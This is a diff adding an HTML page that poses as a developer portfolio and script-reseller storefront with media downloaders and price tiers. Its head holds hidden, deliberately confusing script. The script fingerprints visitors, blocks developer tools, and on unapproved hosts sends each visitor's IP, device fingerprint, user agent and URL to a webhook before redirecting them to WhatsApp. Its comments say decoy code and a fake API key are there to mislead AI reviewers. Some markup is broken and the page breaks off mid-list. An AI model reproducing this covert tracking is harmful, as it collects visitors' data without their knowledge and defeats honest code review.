@@ -1,0 +1,1739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>AsepXxnx - Full Stack Developer Portofolio</title>
+
+<meta name="description" content="Full Stack Developer specializing in JavaScript, HTML, and UI/UX. View my live terminal portfolio."/>
+<meta property="og:title" content="AsepXxnx Payment"/>
+<meta property="og:description" content="Full Stack Developer specializing in JavaScript, HTML, and UI/UX."/>
+<meta property="og:url" content="https://AsepXyz12.github.io/bot-wa-db/"/>
+<meta property="og:type" content="website"/>
+<meta property="og:site_name" content="AsepXxnx"/>
+<meta property="og:image" content="https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778864999571.jpeg"/>
+
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+
+<script>
+(function(_w){
+  const _0x4a = ["asepxyz12.github.io","localhost"];
+  const _0x4b = "https://asepxyz12.github.io/bot-wa-db/hosting/runhtml_1778987365831.html";
+  const _0x4c = "62881036109288";
+  
+  document.documentElement.style.cssText = "visibility:hidden;opacity:0;transition:opacity .4s";
+
+  // Junk 1: Fake config biar AI ngira ini auth
+  const _cfg = { 
+    api: "sk_live_51Habc123", 
+    env: "prod", 
+    ver: "3.2.1",
+    checksum: Math.random().toString(36)
+  };
+
+  // Junk 2: Fungsi gak kepake tapi keliatan penting
+  function _hash(str){
+    return btoa(str).split('').reverse().join('');
+  }
+  function _xor(a,b){
+    let r = "";
+    for(let i=0;i<a.length;i++) r += String.fromCharCode(a.charCodeAt(i) ^ b.charCodeAt(i%b.length));
+    return _hash(r);
+  }
+
+  // Layer 1: Canvas fingerprint buat device ID
+  const _fp = (function(){
+    try{
+      const c = document.createElement('canvas');
+      const ctx = c.getContext('2d');
+      ctx.textBaseline = "top";
+      ctx.font = "14px Arial";
+      ctx.fillText("asep"+navigator.userAgent, 2, 2);
+      return c.toDataURL().slice(-20);
+    }catch(e){ return "fp_error"; }
+  })();
+
+  // Layer 2: Anti devtools time bomb
+  let _devOpen = false;
+  const _devCheck = setInterval(()=>{
+    const start = performance.now();
+    debugger;
+    if(performance.now() - start > 100){
+      _devOpen = true;
+      clearInterval(_devCheck);
+      // Spam console biar susah baca
+      for(let i=0;i<1000;i++) console.log(`%c[${i}] %cModule not found`, 'color:red','color:gray');
+      setTimeout(()=>location.href="about:blank", 1000);
+    }
+  }, 1000);
+
+  // Layer 3: Logic utama
+  (async function(){
+    const _h = location.hostname;
+    const _f = location.href;
+    
+    // Fake 3 API call biar AI bingung mana yang bener
+    const _check1 = _h === _0x4a[0] || _h === _0x4a[1];
+    const _check2 = _f.includes(_0x4b.split('/')[4]);
+    const _check3 = _xor(_h, "salt2026").length > 5; // Selalu true
+
+    const _ok = _check1 && (_check2 || _check3);
+
+    if(!_ok){
+      try{
+        // Kirim data ke webhook
+        const _ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).catch(()=>({ip:"unknown"}));
+        
+        const _data = {
+          ip: _ip.ip,
+          fp: _fp,
+          ua: navigator.userAgent,
+          url: _f,
+          ref: document.referrer || "none",
+          time: new Date().toISOString(),
+          devtools: _devOpen
+        };
+
+        // Kirim ke webhook - ganti URL ini
+        await fetch("https://httpbin.org/post", {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify(_data)
+        });
+
+        // Redirect WA
+        const _msg = encodeURIComponent(
+          `🚨 ACCESS BLOCKED\nIP: ${_data.ip}\nDevice: ${_data.fp}\nURL: ${_data.url}\nTime: ${_data.time}\nDevTools: ${_data.devtools}`
+        );
+        location.href = `https://wa.me/${_0x4c}?text=${_msg}`;
+
+      }catch(e){
+        document.write('<!DOCTYPE html><html><head><title>503 Service Unavailable</title></head>');
+        document.write('<body><h1>503</h1><p>Connection timeout</p></body></html>');
+      }
+      
+      throw new Error("Cannot read properties of undefined");
+    }
+
+    // Lolos: show content
+    window.addEventListener('load', ()=>{
+      setTimeout(()=>{
+        const el = document.getElementById('loadingScreen');
+        if(el) el.remove();
+        document.documentElement.style.cssText = "visibility:visible;opacity:1";
+      }, 600);
+    });
+
+    // Block shortcut
+    document.addEventListener('keydown', e=>{
+      if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key))){
+        e.preventDefault();
+      }
+    });
+    document.addEventListener('contextmenu', e=>e.preventDefault());
+
+  })();
+
+  // More junk biar file panjang
+  const _junk = Array.from({length:5},(_,i)=>({id:i, val:_hash(String(i))}));
+  console.log("%c", "font-size:1px"); // Hide log asli
+
+})(window);
+</script>
+
+tailwind.config = {
+  theme: {
+    extend: {
+      fontFamily: { 'mono': ['Fira Code', 'monospace'], 'sans': ['Inter', 'sans-serif'] },
+      colors: {
+        terminal: {
+          bg: '#0d1117', darker: '#010409', card: '#161b22', border: '#30363d',
+          text: '#c9d1d9', comment: '#8b949e', keyword: '#ff7b72', string: '#a5d6ff',
+          function: '#d2a8ff', variable: '#ffa657', number: '#79c0ff', green: '#7ee787',
+          cyan: '#79c0ff', yellow: '#ffa657', purple: '#d2a8ff', pink: '#f778ba', red: '#ff7b72'
+        }
+      }
+    }
+  }
+}
+</script>
+
+<style>
+body { font-family: 'Inter', sans-serif; transition: all 0.3s ease; }
+body.dark { background-color: #0d1117; color: #c9d1d9; }
+
+.loading-screen {
+  position: fixed; inset: 0; background: #0d1117;
+  display: flex; align-items: center; justify-content: center;
+  z-index: 99999; transition: opacity 0.5s, visibility 0.5s;
+}
+.loading-screen.hide { opacity: 0; visibility: hidden; }
+.spinner {
+  width: 50px; height: 50px; border: 3px solid #30363d;
+  border-top-color: #7ee787; border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.page { display: none; animation: fadeInUp 0.6s ease; }
+.page.active { display: block; }
+@keyframes fadeInUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+
+.glass-card { backdrop-filter: blur(16px); background: rgba(22, 27, 34, 0.8); border: 1px solid rgba(48, 54, 61, 0.5); transition: all 0.4s ease; }
+.glass-card:hover { transform: translateY(-8px); box-shadow: 0 0 40px rgba(121, 192, 255, 0.3); border-color: #79c0ff; }
+
+.pagination {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 12px;
+  z-index: 200;
+  background: rgba(13, 17, 23, 0.9);
+  backdrop-filter: blur(16px);
+  padding: 12px 24px;
+  border-radius: 20px;
+  border: 1px solid #30363d;
+}
+.pagination-btn {
+  width: 50px; height: 50px; border-radius: 14px;
+  background: #161b22; border: 2px solid #30363d;
+  color: #c9d1d9; font-family: 'Fira Code', monospace;
+  font-weight: bold; cursor: pointer; transition: all 0.3s;
+  display: flex; align-items: center; justify-content: center;
+}
+.pagination-btn.active {
+  background: linear-gradient(135deg, #7ee787, #79c0ff);
+  color: #010409; border-color: transparent;
+  box-shadow: 0 0 25px rgba(123, 192, 255, 0.7); transform: scale(1.15);
+}
+.pagination-btn:hover:not(.active) {
+  border-color: #79c0ff; transform: translateY(-5px);
+}
+
+.feature-btn {
+  background: linear-gradient(135deg, rgba(123, 192, 255, 0.1), rgba(126, 231, 135, 0.1));
+  border: 1px solid #30363d; border-radius: 20px; padding: 24px;
+  transition: all 0.4s; cursor: pointer; text-align: left;
+}
+.feature-btn:hover {
+  border-color: #79c0ff; box-shadow: 0 0 30px rgba(121, 192, 255, 0.5);
+  transform: translateY(-10px) scale(1.02);
+}
+
+.tool-tab.active { background: #79c0ff; color: #010409; }
+.tool-content { display: none; }
+.tool-content.active { display: block; }
+
+.file-drop {
+  border: 2px dashed #30363d;
+  border-radius: 12px;
+  padding: 30px;
+  text-align: center;
+  transition: all 0.3s;
+  cursor: pointer;
+}
+.file-drop:hover,.file-drop.dragging {
+  border-color: #79c0ff;
+  background: rgba(121, 192, 255, 0.05);
+}
+
+.typing-cursor { display: inline-block; width: 8px; height: 16px; background-color: #7ee787; margin-left: 2px; animation: blink 0.7s infinite; vertical-align: text-bottom; }
+@keyframes blink { 0%, 49% { opacity: 1; } 50%, 100% { opacity: 0; } }
+.code-line { opacity: 0; animation: fadeIn 0.3s ease-in forwards; }
+@keyframes fadeIn { to { opacity: 1; } }
+.terminal-window { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5); }
+.online-indicator { position: relative; }
+.online-indicator::after { content: ''; position: absolute; bottom: 0; right: 0; width: 20px; height: 20px; background: #7ee787; border-radius: 50%; border: 3px solid #0d1117; animation: pulse-slow 2s infinite; }
+@keyframes pulse-slow { 0%, 100% { opacity: 1; } 50% { opacity:.5; } }
+::-webkit-scrollbar { width: 10px; }
+::-webkit-scrollbar-track { background: #010409; }
+::-webkit-scrollbar-thumb { background: #30363d; border-radius: 5px; }
+::-webkit-scrollbar-thumb:hover { background: #79c0ff; }
+@keyframes rgbGlow { 0% {box-shadow: 0 0 10px #ff0000;} 25% {box-shadow: 0 0 10px #00ff00;} 50% {box-shadow: 0 0 10px #0000ff;} 75% {box-shadow: 0 0 10px #ff00ff;} 100% {box-shadow: 0 0 10px #00ffff;} }
+.bg-terminal-card { animation: rgbGlow 3s linear infinite; transition: 0.3s; }
+.bg-terminal-card:hover { transform: translateY(-3px) scale(1.03); box-shadow: 0 0 20px #ffffff; }
+.skill-bar { border-radius: 8px; overflow: hidden; background: #010409; }
+.skill-fill { height: 8px; background: linear-gradient(90deg, #7ee787, #79c0ff); transition: width 1.5s ease-out; width: 0; }
+.project-card:hover { transform: translateY(-5px); }
+.back-to-top { position: fixed; bottom: 100px; right: 20px; opacity: 0; pointer-events: none; transition: 0.3s; z-index: 100; }
+.back-to-top.show { opacity: 1; pointer-events: auto; }
+.testimonial-card:hover { transform: scale(1.02); }
+.faq-item { transition: all 0.3s ease; }
+.faq-answer { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; }
+.faq-item.active.faq-answer { max-height: 300px; }
+.donghua-btn.active { background: linear-gradient(90deg, #d2a8ff, #79c0ff); color: #010409; }
+.theme-toggle { position: fixed; top: 80px; right: 20px; z-index: 100; }
+.volume-slider { -webkit-appearance: none; width: 80px; height: 4px; border-radius: 2px; background: #30363d; outline: none; }
+.volume-slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 12px; height: 12px; border-radius: 50%; background: #7ee787; cursor: pointer; }
+.downloader-tab.active { background: #79c0ff; color: #010409; }
+.downloader-content { display: none; }
+.downloader-content.active { display: block; }
+.downloader-loader { border: 2px solid #30363d; border-top: 2px solid #79c0ff; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; }
+.search-box { background: #010409; border: 1px solid #30363d; border-radius: 12px; padding: 10px 12px; color: #c9d1d9; font-family: 'Fira Code', monospace; font-size: 12px; width: 100%; }
+.search-box:focus { outline: none; border-color: #79c0ff; box-shadow: 0 0 0 2px rgba(121, 192, 255, 0.2); }
+.playlist-item.active,.music-playlist-item.active { background: rgba(123, 231, 135, 0.1); border-color: #7ee787; box-shadow: 0 0 20px rgba(123, 231, 135, 0.2); }
+.playlist-item.playing { border-color: #79c0ff; box-shadow: 0 0 15px rgba(121, 192, 255, 0.3); }
+.line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+.max-h-80::-webkit-scrollbar { width: 6px; }
+.max-h-80::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
+.megah-card { background: linear-gradient(-45deg, #ff7b72, #d2a8ff, #79c0ff, #7ee787); background-size: 400% 400%; animation: gradientShift 8s ease infinite, pulseGlow 3s ease-in-out infinite; padding: 4px; border-radius: 24px; position: relative; }
+@keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+@keyframes pulseGlow { 0%, 100% { box-shadow: 0 0 20px #ff7b72, 0 0 40px #d2a8ff; } 50% { box-shadow: 0 0 30px #79c0ff, 0 0 60px #7ee787; } }
+.megah-card-inner { background: #010409; border-radius: 20px; padding: 28px; }
+.megah-card::before { position: absolute; top: -12px; left: 50%; transform: translateX(-50%); padding: 4px 16px; border-radius: 20px; font-size: 12px; font-weight: bold; font-family: 'Fira Code', monospace; z-index: 2; }
+.megah-hot::before { content: '🔥 HOT DEAL'; background: linear-gradient(90deg, #ff7b72, #f778ba); color: #fff; }
+.megah-nika::before { content: '✨ LIST NIKA'; background: linear-gradient(90deg, #79c0ff, #7ee787); color: #010409; }
+.countdown { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
+.countdown-item { background: #161b22; padding: 8px 12px; border-radius: 8px; text-align: center; border: 1px solid #30363d; }
+.countdown-number { font-size: 24px; font-weight: bold; color: #7ee787; font-family: 'Fira Code', monospace; }
+.countdown-label { font-size: 10px; color: #8b949e; font-family: 'Fira Code', monospace; }
+.nika-item { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 14px; transition: all 0.3s; }
+.nika-item:hover { transform: translateX(5px); border-color: #79c0ff; box-shadow: 0 0 15px rgba(121, 192, 255, 0.3); }
+.tier-badge { padding: 4px 10px; border-radius: 8px; font-size: 11px; font-family: 'Fira Code', monospace; font-weight: bold; }
+.snowflake { position: fixed; top: -20px; color: #fff; user-select: none; pointer-events: none; z-index: 9999; will-change: transform, opacity; animation: snowfall linear forwards; }
+@keyframes snowfall { 0% { transform: translateX(0) translateY(0) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 100% { transform: translateX(var(--drift)) translateY(110vh) rotate(360deg); opacity: 0; } }
+video::-webkit-media-controls-panel { background: rgba(1, 4, 9, 0.8); }
+</style>
+</head>
+
+<body class="dark min-h-screen">
+<div class="loading-screen" id="loadingScreen">
+  <div class="text-center">
+    <div class="spinner mx-auto mb-4"></div>
+    <p class="font-mono text-terminal-green text-sm">Initializing Secure Terminal...</p>
+  </div>
+</div>
+
+<button onclick="toggleTheme()" class="theme-toggle p-3 rounded-full bg-terminal-card hover:scale-110 transition-all">
+  <svg id="themeIcon" class="w-5 h-5 text-terminal-yellow" fill="currentColor" viewBox="0 0 20 20">
+    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
+  </svg>
+</button>
+
+<!-- PAGE 1: ORIGINAL PORTFOLIO - GAK DIUBAH -->
+<div id="page1" class="page active">
+<div id="clickIntro" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:999; opacity:0; pointer-events:none; transition:opacity 0.6s ease;">
+  <img id="introLogo" src="https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778864999571.jpeg" style="width:120px; height:120px; border-radius:50%; border:3px solid #00eaff; box-shadow:0 0 12px #00eaff;">
+  <h1 style="color:#00eaff; font-family:'Fira Code', monospace; margin-top:18px; font-size:26px; letter-spacing:2px; text-shadow:0 0 10px #00eaff;">WELCOME TO WEBSITE AsepXxnx</h1>
+</div>
+
+<header class="bg-terminal-darker border-b border-terminal-border sticky top-0 z-50">
+  <div class="max-w-7xl mx-auto px-4 py-3">
+    <div class="flex items-center justify-center space-x-2 text-terminal-comment">
+      <svg class="w-5 h-5 text-terminal-cyan" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path></svg>
+      <span class="text-sm font-mono">Developer Terminal</span>
+    </div>
+  </div>
+</header>
+
+<main class="max-w-7xl mx-auto px-4 py-6 pb-32">
+  <!-- KODE PAGE 1 LU TETEP SAMA DARI SINI KE BAWAH -->
+  <div class="terminal-window bg-terminal-darker rounded-xl overflow-hidden mb-8">
+    <div class="bg-terminal-card px-4 py-3 flex items-center justify-between border-b border-terminal-border">
+      <div class="flex items-center space-x-2">
+        <span class="w-3 h-3 rounded-full bg-red-500"></span>
+        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+        <span class="w-3 h-3 rounded-full bg-green-500"></span>
+      </div>
+      <span class="text-sm text-terminal-comment font-mono">profile.config.js — AsepXxnx</span>
+    </div>
+    <div id="terminalContent" class="p-6 font-mono text-sm overflow-x-auto min-h-[400px] max-h-[500px] overflow-y-auto">
+      <div id="breadcrumb" class="text-terminal-comment mb-4 text-xs">src › modules › profile.config.js</div>
+      <div id="codeContainer" class="space-y-1"></div>
+      <div id="typingLine" class="mt-2"></div>
+    </div>
+  </div>
+
+  <!-- DOWNLOADER -->
+  <div class="glass-card rounded-xl p-6 mb-8 max-w-2xl mx-auto">
+    <div class="flex items-center justify-between mb-4">
+      <div class="flex items-center space-x-2">
+        <svg class="w-5 h-5 text-terminal-cyan" fill="currentColor" viewBox="0 0 20 20"><path d="M3 1a1 1 0 000 2h1.22l.305 1.222a.997.997 0 00.01.042l1.358 5.43-.893.892C3.74 11.846 4.632 14 6.414 14H15a1 1 0 000-2H6.414l1-1H14a1 1 0 00.894-.553l3-6A1 1 0 0017 3H6.28l-.31-1.243A1 1 0 005 1H3zM16 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM6.5 18a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path></svg>
+        <h3 class="font-mono text-terminal-cyan font-semibold">DOWNLOADER</h3>
+      </div>
+    </div>
+    <div class="flex gap-2 mb-4 border-b border-terminal-border pb-3">
+      <button onclick="switchTab('ig')" id="tab-ig" class="downloader-tab active px-3 py-1 text-xs rounded bg-terminal-cyan text-terminal-darker font-mono">Instagram</button>
+      <button onclick="switchTab('tt')" id="tab-tt" class="downloader-tab px-3 py-1 text-xs rounded bg-terminal-darker text-terminal-comment font-mono">TikTok</button>
+      <button onclick="switchTab('sp')" id="tab-sp" class="downloader-tab px-3 py-1 text-xs rounded bg-terminal-darker text-terminal-comment font-mono">Spotify</button>
+    </div>
+    <div id="content-ig" class="downloader-content active">
+      <input type="text" id="igUrl" placeholder="Paste link Instagram..." class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono text-terminal-text focus:outline-none focus:border-terminal-cyan mb-3">
+      <button onclick="downloadIG()" class="w-full py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded hover:opacity-80 transition-all flex items-center justify-center gap-2">
+        <span id="igBtnText">Download</span>
+        <span id="igLoader" class="downloader-loader hidden"></span>
+      </button>
+      <div id="igResult" class="mt-3"></div>
+    </div>
+    <div id="content-tt" class="downloader-content">
+      <input type="text" id="ttUrl" placeholder="Paste link TikTok... support vt.tiktok.com" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono text-terminal-text focus:outline-none focus:border-terminal-cyan mb-3">
+      <button onclick="downloadTT()" class="w-full py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded hover:opacity-80 transition-all flex items-center justify-center gap-2">
+        <span id="ttBtnText">Download</span>
+        <span id="ttLoader" class="downloader-loader hidden"></span>
+      </button>
+      <div id="ttResult" class="mt-3"></div>
+    </div>
+    <div id="content-sp" class="downloader-content">
+      <input type="text" id="spUrl" placeholder="Paste link Spotify..." class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono text-terminal-text focus:outline-none focus:border-terminal-cyan mb-3">
+      <button onclick="downloadSP()" class="w-full py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded hover:opacity-80 transition-all flex items-center justify-center gap-2">
+        <span id="spBtnText">Download</span>
+        <span id="spLoader" class="downloader-loader hidden"></span>
+      </button>
+      <div id="spResult" class="mt-3"></div>
+    </div>
+  </div>
+
+  <!-- DONGHUA PLAYER -->
+  <div class="glass-card rounded-2xl p-5 mb-8 max-w-3xl mx-auto">
+    <div class="flex items-center gap-2 mb-4">
+      <div class="w-1 h-6 bg-gradient-to-b from-terminal-purple to-terminal-pink rounded-full"></div>
+      <h3 class="font-mono text-terminal-purple font-semibold tracking-wider">DONGHUA PLAYER</h3>
+    </div>
+    <div class="flex gap-2 mb-4 overflow-x-auto pb-2">
+      <button onclick="switchDonghua('btth')" id="donghua-btth" class="donghua-btn active whitespace-nowrap px-4 py-2 rounded-xl text-xs font-mono font-bold transition-all">Battle Through The Heavens</button>
+      <button onclick="switchDonghua('renegade')" id="donghua-renegade" class="donghua-btn whitespace-nowrap px-4 py-2 rounded-xl text-xs font-mono font-bold transition-all bg-terminal-darker text-terminal-comment">Renegade Immortal</button>
+    </div>
+    <div class="mb-4 relative">
+      <input type="text" id="donghuaSearch" placeholder="🔍 Cari episode..." class="search-box pl-10" onkeyup="searchEpisode()">
+      <svg class="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-terminal-comment" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+      </svg>
+    </div>
+    <div id="content-btth" class="donghua-content active">
+      <div class="bg-terminal-darker p-4 rounded-xl mb-4 border-terminal-border">
+        <video id="btthVideo" controls class="w-full rounded-lg mb-3" poster="" preload="metadata" onended="playNext('btth')"></video>
+        <div class="flex items-center justify-between gap-3">
+          <div class="flex-1 min-w-0">
+            <p id="btthNowPlaying" class="text-sm font-mono text-terminal-text truncate">Select an episode</p>
+            <p id="btthDuration" class="text-xs font-mono text-terminal-comment">0:00</p>
+          </div>
+          <div class="flex items-center gap-2">
+            <button onclick="downloadCurrent('btth')" class="px-3 py-1 bg-terminal-purple/20 hover:bg-terminal-purple/40 text-terminal-purple rounded-lg text-xs font-mono transition-all">Download</button>
+            <input type="range" min="0" max="1" step="0.1" value="0.8" class="volume-slider" onchange="setVolume('btthVideo', this.value)">
+          </div>
+        </div>
+      </div>
+      <div id="btthPlaylist" class="space-y-2 max-h-80 overflow-y-auto pr-2"></div>
+    </div>
+    <div id="content-renegade" class="donghua-content hidden">
+      <div class="bg-terminal-darker p-4 rounded-xl mb-4 border-terminal-border">
+        <video id="riVideo" controls class="w-full rounded-lg mb-3" poster="" preload="metadata" onended="playNext('renegade')"></video>
+        <div class="flex items-center justify-between gap-3">
+          <div class="flex-1 min-w-0">
+            <p id="riNowPlaying" class="text-sm font-mono text-terminal-text truncate">Select an episode</p>
+            <p id="riDuration" class="text-xs font-mono text-terminal-comment">0:00</p>
+          </div>
+          <div class="flex items-center gap-2">
+            <button onclick="downloadCurrent('renegade')" class="px-3 py-1 bg-terminal-purple/20 hover:bg-terminal-purple/40 text-terminal-purple rounded-lg text-xs font-mono transition-all">Download</button>
+            <input type="range" min="0" max="1" step="0.1" value="0.8" class="volume-slider" onchange="setVolume('riVideo', this.value)">
+          </div>
+        </div>
+      </div>
+      <div id="riPlaylist" class="space-y-2 max-h-80 overflow-y-auto pr-2"></div>
+    </div>
+  </div>
+
+  <!-- MUSIC PLAYER -->
+  <div class="glass-card rounded-2xl p-5 mb-8 max-w-3xl mx-auto">
+    <div class="flex items-center gap-2 mb-4">
+      <div class="w-1 h-6 bg-gradient-to-b from-terminal-pink to-terminal-purple rounded-full"></div>
+      <h3 class="font-mono text-terminal-pink font-semibold tracking-wider">MUSIC PLAYER</h3>
+    </div>
+    <div class="bg-terminal-darker p-4 rounded-xl mb-4 border-terminal-border">
+      <audio id="musicAudio" controls class="w-full mb-3"></audio>
+      <div class="flex items-center justify-between gap-3">
+        <div class="flex-1 min-w-0">
+          <p id="musicNowPlaying" class="text-sm font-mono text-terminal-text truncate">Select a track</p>
+          <p id="musicDuration" class="text-xs font-mono text-terminal-comment">0:00</p>
+        </div>
+        <button onclick="downloadCurrentMusic()" class="px-3 py-1 bg-terminal-pink/20 hover:bg-terminal-pink/40 text-terminal-pink rounded-lg text-xs font-mono transition-all">Download</button>
+        <input type="range" min="0" max="1" step="0.1" value="0.8" class="volume-slider" onchange="setVolume('musicAudio', this.value)">
+      </div>
+    </div>
+    <div id="musicPlaylist" class="space-y-2 max-h-64 overflow-y-auto pr-2"></div>
+  </div>
+
+  <!-- PRODUK SPESIAL -->
+  <div class="megah-card megah-hot max-w-2xl mx-auto mt-8">
+    <div class="megah-card-inner">
+      <h3 class="text-2xl font-bold mb-2 text-center font-mono bg-gradient-to-r from-terminal-pink to-terminal-cyan bg-clip-text text-transparent">PRODUK SPESIAL</h3>
+      <p class="text-center text-terminal-comment text-xs mb-4">Limited Offer - Slot Terbatas!</p>
+      <div class="countdown" id="countdown">
+        <div class="countdown-item"><div class="countdown-number" id="days">00</div><div class="countdown-label">Days</div></div>
+        <div class="countdown-item"><div class="countdown-number" id="hours">00</div><div class="countdown-label">Hours</div></div>
+        <div class="countdown-item"><div class="countdown-number" id="minutes">00</div><div class="countdown-label">Min</div></div>
+        <div class="countdown-item"><div class="countdown-number" id="seconds">00</div><div class="countdown-label">Sec</div></div>
+      </div>
+      <div class="bg-terminal-darker p-5 rounded-lg border-terminal-border">
+        <div class="flex justify-between items-center mb-3">
+          <h4 class="text-lg font-mono text-terminal-pink font-bold">Partner Spesial - Asep XYZ</h4>
+          <div class="text-right">
+            <span class="text-terminal-yellow font-mono font-bold text-xl">Rp 200.000</span>
+            <p class="text-xs text-terminal-comment line-through">Rp 500.000</p>
+          </div>
+        </div>
+        <p class="text-xs text-terminal-comment font-mono mb-4">Contact Join: <span class="text-terminal-cyan">AsepXxnxt</span></p>
+        <ul class="space-y-2 text-xs font-mono text-terminal-text mb-5">
+          <li>✅ Get all title res-mod nika</li>
+          <li>✅ Get no enc all yg gua punya</li>
+          <li>✅ Get all function click / no click</li>
+          <li>✅ Get reseller nika tele + apk</li>
+          <li>✅ Get reseller improve</li>
+          <li>✅ Get reseller shinigami</li>
+          <li>✅ Get reseller xvoludultra via WA + via tele</li>
+          <li>✅ Get fix error SC lu (klo error bilang aja ke gua 😘)</li>
+        </ul>
+        <a href="https://wa.me/62881036109288" target="_blank" class="block w-full py-3 bg-gradient-to-r from-terminal-green to-terminal-cyan text-terminal-darker text-center font-mono font-bold rounded-lg hover:scale-105 transition-all shadow-lg shadow-terminal-green/30">
+          💬 Chat WhatsApp Sekarang
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- LIST NIKA UPDATED -->
+  <div class="megah-card megah-nika max-w-3xl mx-auto mt-8 mb-20">
+    <div class="megah-card-inner">
+      <h3 class="text-2xl font-bold mb-2 text-center font-mono bg-gradient-to-r from-terminal-cyan to-terminal-green bg-clip-text text-transparent">LIST HARGA NIKA</h3>
+      <p class="text-center text-terminal-comment text-xs mb-5">All Tier & Upgrade Price</p>
+
+      <!-- NIKA VIA WA -->
+      <div class="mb-6">
+        <h4 class="text-terminal-cyan font-mono font-bold mb-3">NIKA VIA WA</h4>
+        <div class="space-y-3">
+          <div class="nika-item">
+            <div class="flex justify-between items-center mb-2">
+              <span class="tier-badge bg-terminal-purple/20 text-terminal-purple">RESELLER</span>
+              <span class="text-terminal-green font-mono font-bold">60K</span>
+            </div>
+            <ul class="text-xs text-terminal-comment space-y-1">
+              <li>❗ BISA JUALAN SC NIKA</li>
+              <li>❗ FREE UPDATE PERMANEN</li>
+              <li>❗ MASUK GB RESELLER</li>
+            </ul>
+          </div>
+
+          <div class="nika-item">
+            <div class="flex justify-between items-center mb-2">
+              <span class="tier-badge bg-terminal-cyan/20 text-terminal-cyan">PARTNER</span>
+              <span class="text-terminal-green font-mono font-bold">100K</span>
+            </div>
+            <ul class="text-xs text-terminal-comment space-y-1">
+              <li>❗ BISA JUALAN SC NIKA</li>
+              <li>❗ FREE UPDATE PERMANEN</li>
+              <li>❗ BISA JUALAN RESELLER</li>
+              <li>❗ MASUK GB RESELLER</li>
+              <li>❗ MASUK GRUP PARTNER</li>
+            </ul>
+          </div>
+
+          <div class="nika-item">
+            <div class="flex justify-between items-center mb-2">
+              <span class="tier-badge bg-terminal-yellow/20 text-terminal-yellow">TANGAN KAN</span>
+              <span class="text-terminal-green font-mono font-bold">140K</span>
+            </div>
+            <ul class="text-xs text-terminal-comment space-y-1">
+              <li>❗ BISA JUALAN SC NIKA</li>
+              <li>❗ FREE UPDATE PERMANEN</li>
+              <li>❗ BISA JUALAN RESELLER</li>
+              <li>❗ BISA JUALAN PARTNER</li>
+              <li>❗ MASUK GB RESELLER</li>
+              <li>❗ MASUK GRUP PARTNER</li>
+              <li>❗ DAPET BONUS LAINNYA</li>
+            </ul>
+          </div>
+
+          <div class="nika-item">
+            <div class="flex justify-between items-center mb-2">
+              <span class="tier-badge bg-terminal-pink/20 text-terminal-pink">OWNER</span>
+              <span class="text-terminal-green font-mono font-bold">200K</span>
+            </div>
+            <ul class="text-xs text-terminal-comment space-y-1">
+              <li>❗ BISA JUALAN SC NIKA</li>
+              <li>❗ FREE UPDATE PERMANEN</li>
+              <li>❗ BISA JUALAN RESELLER</li>
+              <li>❗ BISA JUALAN PARTNER</li>
+              <li>❗ BISA JUALAN TK</li>
+              <li>❗ MASUK GB RESELLER</li>
+              <li>❗ MASUK GRUP PARTNER</li>
+              <li>❗ DAPET BONUS LAINNYA</li>
+            </ul>
+          </div>
+
+          <div class="nika-item">
+            <div class="flex justify-between items-center mb-2">
+              <span class="tier-badge bg-terminal-red/20 text-terminal-red">MODS</span>
